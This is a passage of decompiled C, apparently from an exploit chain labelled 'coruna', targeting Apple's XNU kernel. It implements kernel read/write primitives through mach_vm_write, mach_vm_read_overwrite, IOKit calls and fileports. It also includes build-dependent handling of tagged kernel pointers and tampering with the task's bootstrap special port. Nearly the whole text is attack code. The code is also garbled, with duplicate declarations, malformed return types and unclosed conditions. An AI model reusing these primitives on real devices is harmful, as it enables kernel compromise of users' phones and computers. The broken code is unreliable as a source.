    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return 0;
}





uint64_t coruna_pthread_from_mach_thread_np_1dea8(long handle)
{
  pthread_t p_Var1;
  vm_address_t address;
  
  if (1 < *(mach_port_t *)(handle + 0xac) + 1) {
    p_Var1 = _pthread_from_mach_thread_np(*(mach_port_t *)(handle + 0xac));
    if (1 < *(semaphore_t *)(handle + 0xd0) + 1) {
      _semaphore_signal(*(semaphore_t *)(handle + 0xd0));
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(handle + 0xd0));
      *(uint32_t *)(handle + 0xd0) = 0;
    }
    if (p_Var1 != (pthread_t)0x0) {
      _pthread_join(p_Var1,(void **)0x0);
    }
    *(uint32_t *)(handle + 0xac) = 0;
  }
  address = *(vm_address_t *)(handle + 0xb0);
  if ((address != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0xb8)
                  );
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
  }
  *(uint64_t *)(handle + 200) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return 0;
}





uint64_t coruna_kernel600c_residual_228(uint *size,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  uint64_t size;
  
  u = coruna_kernel600c_via_kernel600c_via_fd_read_full_2();
  if ((int)u != 0) {
    size = *id_2;
    if ((*size & 0x5584001) != 0) {
      size = coruna_kernel600c_via_ctx_test_flag_10(size);
    }
    *id_2 = size;
  }
  return u;
}





void coruna_kernel600c_residual_229(long handle,uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  
  scratch = id_2;
  coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,val,&scratch,*(uint32_t *)(handle + 0x168),1);
  return;
}





uint64_t coruna_vm_deallocate_1e004(long handle)
{
  vm_address_t address;
  uint64_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
  if (ptr != (uint64_t *)0x0) {
    address = ptr[2];
    if ((address != 0) && (ptr[3] != 0)) {
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,ptr[3]);
      ptr[2] = 0;
      ptr[3] = 0;
      ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
      if (ptr == (uint64_t *)0x0) {
        return 0xad001;
      }
    }
    *(uint64_t *)(&k_kernel_slot_1d48 + handle) = 0;
    *(uint8_t *)(ptr + 9) = 1;
    ___ulock_wake(0x201,(long)ptr + 0x34,*(uint32_t *)(ptr + 6));
    _pthread_join((pthread_t)ptr[5],(void **)0x0);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[9] = 0;
    ptr[8] = 0;
    ptr[0xb] = 0;
    ptr[10] = 0;
    ptr[0xd] = 0;
    ptr[0xc] = 0;
    ptr[0xe] = 0;
    _free(ptr);
    u = 0;
  }
  return u;
}





bool coruna_mach_vm_machine_attribute(long handle,mach_vm_address_t arg,uint32_t size)
{
  int err;
  int status;
  uint32_t scratch;
  vm_machine_attribute_val_t bootargs;
  
  scratch = size;
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
                                 (vm_offset_t)&scratch,4);
          bootargs = 7;
          _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
             (vm_offset_t)&scratch,4);
             bootargs = 7;
             _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1d334(handle,arg,&scratch,4,1);
        }
      }
      else {
        err = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,arg,&scratch,4,1);
      }
    }
    else {
      err = coruna_ioconnectcallmethod_1dbc0(handle,arg,&scratch,4,1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x40))(handle,arg,&scratch,4,1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





bool coruna_kernel600c_via_kernel600c_via_fd_read_full(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  int status;
  uint8_t scratch[8];
  
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
                               *(uint32_t *)(handle + 0x178),id_2,scratch);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
             *(uint32_t *)(handle + 0x178),id_2,scratch);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1c9b8(handle,val,id_2,4,1);
        }
      }
      else {
        err = coruna_kernel600c_via_kptr_in_mapped_range(handle,val,id_2,4,1);
      }
    }
    else {
      err = coruna_ioconnectcallmethod(handle,val,id_2,4,1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))(handle,val,id_2,4,1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





kern_return_t
void coruna_mach_vm_read_overwrite(vm_map_t arg,long handle,unsigned long arg_x,unsigned long arg,long addr_2,unsigned long *val)
{
  unsigned long u;
  mach_vm_size_t size;
  kern_return_t lk2;
  unsigned long size;
  unsigned long scratch;
  
  if (arg_x == 0) {
    lk2 = 4;
  }
  else {
    size = 0;
    u = arg_x;
    if (arg != 0) {
      u = arg;
    }
    do {
      size = arg_x;
      if (u <= arg_x) {
        size = u;
      }
      scratch = arg_x;
      lk2 = _mach_vm_read_overwrite(arg,size + handle,size,size + addr_2,&scratch);
      if (lk2 != 0) {
        return lk2;
      }
      size = (unsigned long)(uint)((int)scratch + (int)size);
      arg_x = arg_x - scratch;
    } while (arg_x != 0);
    lk2 = 0;
    if (val != (unsigned long *)0x0) {
      *val = size;
    }
  }
  return lk2;
}





bool coruna_kernel600c_via_kernel600c_via_fd_read_full_2(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  int status;
  uint8_t scratch[8];
  
  *id_2 = 0;
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,
                               (long)*(int *)(handle + 0x168),*(uint32_t *)(handle + 0x178),
                               id_2,scratch);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,
             (long)*(int *)(handle + 0x168),*(uint32_t *)(handle + 0x178),
             id_2,scratch);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1c9b8(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
        }
      }
      else {
        err = coruna_kernel600c_via_kptr_in_mapped_range(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
      }
    }
    else {
      err = coruna_ioconnectcallmethod(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))
                      (handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





uint64_t coruna_kernel600c_via_ctx_test_flag_8(uint *size,uint64_t val)
{
  int err;
  uint64_t u;
  
  err = coruna_ctx_test_flag(size,0x5584001);
  if ((err != 0) && ((*size & 0x5584001) != 0)) {
    u = coruna_kernel600c_via_ctx_test_flag_10(size,val);
    return u;
  }
  return val;
}





uint64_t coruna_kernel600c_via_ctx_test_flag_9(uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  
  err = coruna_ctx_test_flag(val,0x5584001);
  if (err != 0) {
    u = coruna_kernel600c_via_ctx_test_flag_10(val,id_2);
    return u;
  }
  return id_2;
}





unsigned long coruna_kernel600c_via_ctx_test_flag_10(long arg,unsigned long val)

{
  int fd_11;
  
  if ((val != 0) && ((val >> 0x37 & 1) != 0)) {
    fd_11 = coruna_ctx_test_flag(arg,8);
    if ((fd_11 == 0) &&
       ((fd_11 = coruna_ctx_test_flag(arg,0x5000000), fd_11 == 0 ||
        (*(unsigned long *)(arg + 0x158) < 0x22580a06c00000)))) {
      val = val | 0xffffff8000000000;
    }
    else {
      val = val | 0xffff800000000000;
    }
  }
  return val;
}





bool coruna_mach_vm_machine_attribute_1e63c(long handle,mach_vm_address_t arg,uint64_t val,int flags)
{
  uint u;
  int err;
  uint size;
  long handle;
  mach_vm_address_t *lpm5;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  scratch = val;
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          err = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
                                 (vm_offset_t)&scratch,*(mach_msg_type_number_t *)(handle + 0x168)
                                );
          thread_attr = coruna_u64_pack((thread_attr), (7));
          _mach_vm_machine_attribute
                    (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),
                     1,(vm_machine_attribute_val_t *)&thread_attr);
          return err == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             err = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
             (vm_offset_t)&scratch,*(mach_msg_type_number_t *)(handle + 0x168)
             );
             thread_attr = coruna_u64_pack((thread_attr), (7));
             _mach_vm_machine_attribute
             (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),
             1,(vm_machine_attribute_val_t *)&thread_attr);
             return err == 0;
        }
        else {
          bootargs = val;
          if (flags == 0) {
            u = coruna_fcntl_1d334(handle,arg,&bootargs,*(uint32_t *)(handle + 0x168),1);
          }
          else {
            u = coruna_mach_absolute_time_1c000(handle,1,&k_kernel_slot_2710);
            if (u == 0) {
              if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
                size = coruna_open_sepmgr_1f500(handle,arg,val);
              }
              else {
                handle = *(long *)(handle + 0x28);
                if ((handle == 0) || (*(semaphore_t *)(handle + 8) + 1 < 2)) {
                  size = 0xad001;
                }
                else {
                  size = 0xad001;
                  if (1 < *(int *)(handle + 0xc) + 1U) {
                    lpm5 = (mach_vm_address_t *)(handle + 0x20);
                    *lpm5 = arg;
                    *(uint64_t **)(handle + 0x28) = &thread_attr;
                    *(uint64_t *)(handle + 0x30) = 8;
                    thread_attr = val;
                    u = _semaphore_signal(*(semaphore_t *)(handle + 8));
                    if (u == 0) {
                      u = _semaphore_timedwait
                                        (*(semaphore_t *)(handle + 0xc),(mach_timespec_t)0x3);
                      size = *(uint *)(handle + 0x3c);
                      if (size != 0) {
                        *lpm5 = 0;
                        *(uint64_t *)(handle + 0x28) = 0;
                        *(uint64_t *)(handle + 0x30) = 0;
                        coruna_semaphore_destroy(handle,0);
                        goto cleanup;
                      }
                      size = 0;
                      if (u != 0) {
                        size = u | 0x80000000;
                      }
                    }
                    else {
                      size = u | 0x80000000;
                    }
                    *lpm5 = 0;
                    *(uint64_t *)(handle + 0x28) = 0;
                    *(uint64_t *)(handle + 0x30) = 0;
                  }
                }
              }
cleanup:
              u = 0xad008;
              if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
                u = 0;
                *(uint32_t *)(*(long *)(handle + 0x118) + 1) = 0;
              }
              if (size != 0) {
                u = size;
              }
            }
          }
        }
      }
      else {
        u = coruna_kernel600c_via_ioconnectcallscalarmethod(handle,arg,val);
      }
    }
    else {
      u = coruna_ioconnectcallmethod_1dbc0(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    u = (**(void (**)(handle + 0x40))
                      (handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
  }
  err = 0;
  if (u != 0) {
    err = 5;
  }
done:
  return err == 0;
}





void coruna_call_mach_vm_machine_attribute_29df8_1e8e0(void)
{
  coruna_mach_vm_machine_attribute_1e63c();
  return;
}





bool coruna_kernel600c_via_mach_make_memory_entry_2da70_2(long handle,unsigned long arg,uint64_t val)
{
  int err;
  bool err;
  uint8_t scratch[32];
  unsigned long bootargs;
  long thread_attr [8];
  
  thread_attr[6] = 0;
  thread_attr[3] = 0;
  thread_attr[2] = 0;
  thread_attr[5] = 0;
  thread_attr[4] = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  err = coruna_call_mach_vm_machine_attribute_29df8_17fcc(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if (err == 0) {
    err = false;
  }
  else {
    err = coruna_mach_make_memory_entry_2da70(handle,bootargs & 0xffffffffc000,thread_attr);
    err = err == 0;
    if (err) {
      *(uint64_t *)((*(unsigned long *)(handle + 0x188) & arg) + thread_attr[0]) = val;
    }
    if (thread_attr[0] != 0) {
      coruna_mach_port_deallocate_2ddc8(handle,thread_attr);
    }
  }
  return err;
}





void coruna_call_mach_vm_machine_attribute_29df8_1e994(void)
{
  coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice();
  return;
}





long coruna_return_zero_1e99c(long handle,unsigned long arg)
{
  long handle;
  uint scratch;
  
  if ((arg & 0xffffffff) != 0) {
    if (-1 < (int)arg) {
      handle = coruna_kernel600c_via_ctx_test_flag_14(handle,0,&scratch);
      if (handle == 0) {
        return 0;
      }
      return ((arg & 0xffffffff) << ((unsigned long)scratch & 0x3f)) + handle;
    }
    if ((*(long *)(handle + 0x1f0) != 0) && (*(uint *)(handle + 0x1f8) != 0)) {
      return *(long *)(handle + 0x1f0) + (arg & 0x7fffffff) * (unsigned long)*(uint *)(handle + 0x1f8)
    }
  }
  return 0;
}





unsigned long coruna_kernel600c_via_ctx_test_flag_11(long arg,unsigned long val,uint *n)

{
  int fd_11;
  unsigned long type_id_17;
  unsigned long u;
  unsigned long size;
  uint version;
  unsigned long type_id_13;
  long serial_18;
  unsigned long type_id_14;
  
  fd_11 = coruna_ctx_test_flag(arg,0x5584001);
  if (fd_11 == 0) {
    version = (uint)(ushort)(val >> 0x30);
    if ((val & 0x800000000000) != 0) {
      version = (uint)((val >> 0x30) << 0xe);
    }
    *n = version;
    type_id_14 = val | 0xffff800000000000;
  }
  else {
    fd_11 = coruna_ctx_test_flag(arg,8);
    if ((fd_11 == 0) && (fd_11 = coruna_ctx_test_flag(arg,0x5000000), fd_11 == 0)) {
      type_id_17 = *(unsigned long *)(arg + 0x158);
      u = 0xffffffffffffffe0;
      if (type_id_17 < 0x22581401900000) {
        u = 0xffffff9ffffffff0;
      }
      size = 0xffffffbfffffc000;
      if (type_id_17 < 0x22581401900000) {
        size = 0xffffff9fffffc000;
      }
      serial_18 = 0x25;
      if (0x225814018fffff < type_id_17) {
        serial_18 = 0x26;
      }
      type_id_13 = 0x6000000000;
      type_id_14 = 0x4000000000;
    }
    else {
      type_id_17 = *(unsigned long *)(arg + 0x158);
      u = 0xffffffffffffffe0;
      if (type_id_17 < 0x22581401900000) {
        u = 0xffff9ffffffffff0;
      }
      size = 0xffffbfffffffc000;
      if (type_id_17 < 0x22581401900000) {
        size = 0xffff9fffffffc000;
      }
      serial_18 = 0x2d;
      if (0x225814018fffff < type_id_17) {
        serial_18 = 0x2e;
      }
      type_id_13 = 0x600000000000;
      type_id_14 = 0x400000000000;
    }
    if (type_id_17 < 0x22581401900000) {
      type_id_14 = type_id_13;
    }
    type_id_13 = 3;
    if (0x225814018fffff < type_id_17) {
      type_id_13 = 1;
    }
    type_id_13 = type_id_13 & val >> serial_18;
    if (type_id_13 == 0) {
      version = ((uint)val & 0x3fff) << 0xe;
    }
    else {
      if (0x225814018fffff < type_id_17) {
        type_id_13 = val & 0x10 | 0x20;
      }
      version = (uint)(type_id_13 << (val & 0xf));
      size = u;
    }
    *n = version;
    type_id_14 = size & val | type_id_14;
  }
  return type_id_14;
}





bool coruna_kernel600c_via_kernel600c_via_fd_read_full_3(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  int status;
  
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
                               *(uint32_t *)(handle + 0x178),size_3,0);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
             *(uint32_t *)(handle + 0x178),size_3,0);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1c9b8(handle,val,size_3,id_2);
        }
      }
      else {
        err = coruna_kernel600c_via_kptr_in_mapped_range(handle,val,size_3,id_2);
      }
    }
    else {
      err = coruna_ioconnectcallmethod(handle,val,size_3,id_2);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))(handle,val,size_3,id_2);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





void coruna_call_mach_vm_machine_attribute_29df8_1ec70(void)
{
  coruna_kernel600c_via_kernel600c_via_fd_read_full_3();
  return;
}





bool coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(long handle)
{
  int err;
  int status;
  
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_machine_attribute_1ef74(*(uint32_t *)(&k_kernel_slot_1918 + handle));
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_machine_attribute_1ef74(*(uint32_t *)(&k_kernel_slot_1918 + handle));
             return status == 0;
        }
        else {
          err = coruna_fcntl_1d334();
        }
      }
      else {
        err = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice();
      }
    }
    else {
      err = coruna_ioconnectcallmethod_1dbc0();
    }
  }
  else {
    err = (**(void (**)(handle + 0x40))();
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





void coruna_call_mach_vm_machine_attribute_29df8_1ed48(void)
{
  coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice();
  return;
}





void coruna_kernel600c_via_mach_vm_machine_attribute(long handle,long addr_2,uint64_t val)
{
  int err;
  uint32_t scratch;
  
  scratch = (uint32_t)val;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err == 0) {
      addr_2 = coruna_kernel600c_via_return_zero_2d8b4(handle,addr_2);
      coruna_mach_vm_machine_attribute(handle,addr_2,val);
      return;
    }
    else {
      coruna_vm_deallocate(handle,addr_2,&scratch,4);
    }
    return;
  }
fail:
  coruna_mach_vm_machine_attribute(handle,addr_2,val);
  return;
}





void coruna_kernel600c_via_mach_vm_machine_attribute_1e63c(long handle,long addr_2,uint64_t val)
{
  uint8_t u;
  int err;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = *(uint8_t *)(handle + 0xc);
  }
  else {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err != 0) {
      coruna_kernel600c_via_return_zero_1071c(handle,addr_2,val);
      return;
    }
    addr_2 = coruna_kernel600c_via_return_zero_2d8b4(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
    u = *(uint8_t *)(handle + 0xc);
  }
  coruna_mach_vm_machine_attribute_1e63c(handle,addr_2,val,u);
  return;
}





void coruna_kernel600c_via_vm_deallocate(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  int err;
  
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err != 0) {
      coruna_vm_deallocate(handle,addr_2,val,id_2);
      return;
    }
    addr_2 = coruna_kernel600c_via_return_zero_2d8b4(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
  }
  coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(handle,addr_2,val,id_2,1);
  return;
}





kern_return_t
void coruna_mach_vm_machine_attribute_1ef74(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint size,uint flags_2)
{
  uint u;
  uint dataCnt;
  kern_return_t lk2;
  long handle;
  uint size;
  vm_machine_attribute_val_t scratch;
  
  u = size;
  if (flags_2 != 0) {
    u = flags_2;
  }
  if (size != 0) {
    handle = 0;
    size = size;
    do {
      dataCnt = size;
      if (u <= size) {
        dataCnt = u;
      }
      lk2 = _mach_vm_write(arg,handle + arg_x,handle + handle,dataCnt);
      if (lk2 != 0) {
        return lk2;
      }
      handle = handle + (unsigned long)dataCnt;
      size = size - dataCnt;
    } while (size != 0);
  }
  scratch = 7;
  _mach_vm_machine_attribute(arg,arg_x,(unsigned long)size,1,&scratch);
  return 0;
}





unsigned long coruna_mach_port_get_attributes(long arg)

{
  mach_port_name_t name;
  uint8_t *str;
  uint8_t *buf;
  int fd_12;
  uint size;
  kern_return_t lk5;
  uint type_id_13;
  unsigned long port;
  long serial_17;
  unsigned long type_id_15;
  mach_msg_type_number_t cache_71;
  integer_t cache_47 [3];
  int cache_72;
  uint64_t cache_87;
  uint64_t cache_46;
  uint64_t cache_89;
  uint64_t cache_48;
  uint64_t cache_52;
  uint64_t cache_49;
  uint32_t cache_51;
  mach_msg_type_number_t cache_76;
  ipc_info_tree_name_array_t cache_75;
  mach_msg_type_number_t cache_94;
  ipc_info_name_array_t cache_77;
  ipc_info_space_t cache_90;
  ipc_space_t cache_95;
  
  if (arg == 0) {
    port = 0xad001;
  }
  else if (*(int *)k_kernel_bootstrap_port_slot + 1U < 2) {
    port = 0x28003;
    cache_95 = 0;
    fd_12 = coruna_call_macho_data_seg_2bb24_2bdb4_30b98(arg,1,&cache_95);
    if (fd_12 != 0) {
      cache_90.iis_genno_mask = 0;
      cache_90.iis_table_size = 0;
      cache_90.iis_table_next = 0;
      cache_90.iis_tree_size = 0;
      cache_90.iis_tree_small = 0;
      cache_90.iis_tree_hash = 0;
      cache_77 = (ipc_info_name_array_t)0x0;
      cache_94 = 0;
      cache_75 = (ipc_info_tree_name_array_t)0x0;
      cache_76 = 0;
      size = _mach_port_space_info(cache_95,&cache_90,&cache_77,&cache_94,&cache_75,&cache_76);
      buf = k_kernel_mach_task_self_slot;
      if (size == 0) {
        if (cache_94 != 0) {
          serial_17 = 0;
          type_id_15 = 0;
          do {
            cache_51 = 0;
            cache_48 = 0;
            cache_89 = 0;
            cache_49 = 0;
            cache_52 = 0;
            ghidra_stack_1 = 0;
            cache_47[0] = 0;
            cache_47[1] = 0;
            cache_46 = 0;
            cache_87 = 0;
            cache_71 = 0x11;
            if (((((*(byte *)((long)&cache_77->iin_type + serial_17 + 2) & 0x1f) != 0) &&
                 (name = *(mach_port_name_t *)((long)&cache_77->iin_name + serial_17), 1 < name + 1)) &&
                (lk5 = _mach_port_get_attributes(cache_95,name,7,cache_47,&cache_71), lk5 == 0))
               && ((cache_72 == 0x80 && ((~cache_89 & 6) == 0)))) {
              if ((1 < *(int *)((long)&cache_77->iin_name + serial_17) + 1U) &&
                 ((serial_17 = coruna_kernel600c_via_return_zero_290d4(arg,cache_95), str = k_kernel_bootstrap_port_slot,
                  serial_17 != 0 &&
                  (port = coruna_mach_port_request_notification(arg,serial_17,k_kernel_bootstrap_port_slot), (int)port == 0
                  )))) {
                type_id_13 = _task_set_special_port(*(task_t *)buf,4,*(mach_port_t *)str);
                size = 0;
                if (type_id_13 != 0) {
                  size = type_id_13 | 0x80000000;
                }
                port = (unsigned long)size;
              }
              break;
            }
            type_id_15 = type_id_15 + 1;
            serial_17 = serial_17 + 0x1c;
          } while (type_id_15 < cache_94);
        }
      }
      else {
        port = (unsigned long)(size | 0x80000000);
      }
      if ((cache_77 != (ipc_info_name_array_t)0x0) && (cache_94 != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)cache_77,(unsigned long)cache_94 * 0x1c);
      }
      if ((cache_75 != (ipc_info_tree_name_array_t)0x0) && (cache_76 != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)cache_75,(unsigned long)cache_76 * 0x24);
      }
      _mach_port_deallocate(*(ipc_space_t *)buf,cache_95);
    }
  }
  else {
    port = 0;
  }
  return port;
}





int coruna_semaphore_timedwait(long handle,uint size)
{
  kern_return_t lk1;
  
  lk1 = _semaphore_timedwait
                    (*(semaphore_t *)(handle + 0x264),
                     (mach_timespec_t)
                     ((unsigned long)size / 1000000 | (unsigned long)((size % 1000000) * 1000 >> 3) << 0x23));
  return -(uint)(lk1 != 0x31);
}





uint64_t coruna_mach_port_deallocate_1f284(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint *ptr;
  long handle;
  long addr;
  sockaddr scratch;
  uint64_t scratch;
  uint64_t bootargs;
  long bootargs;
  mach_port_name_t thread_attr;
  
  addr = *(long *)(handle + 0x28);
  if (addr == 0) {
    return 0;
  }
  thread_attr = 0;
  err = _socket(0x20,2,2);
  if (-1 < err) {
    scratch.sa_data[6] = '\0';
    scratch.sa_data[7] = '\0';
    scratch.sa_data[8] = '\0';
    scratch.sa_data[9] = '\0';
    scratch.sa_data[10] = '\0';
    scratch.sa_data[0xb] = '\0';
    scratch.sa_data[0xc] = '\0';
    scratch.sa_data[0xd] = '\0';
    bootargs = 0;
    scratch = 0;
    scratch.sa_len = '\0';
    scratch.sa_family = '\0';
    scratch.sa_data[0] = '\0';
    scratch.sa_data[1] = '\0';
    scratch.sa_data[2] = '\x02';
    scratch.sa_data[3] = '\0';
    scratch.sa_data[4] = '\0';
    scratch.sa_data[5] = '\0';
    status = _connect(err,&scratch,0x20);
    if ((status == 0) && (status = _fileport_makeport(err,&thread_attr), status == 0)) {
      u = coruna_kernel600c_via_ptr_canonicalize_6(handle,thread_attr,&bootargs);
      if (u == 0) {
        status = coruna_kernel600c_residual_228(handle,bootargs + 0x10,&bootargs);
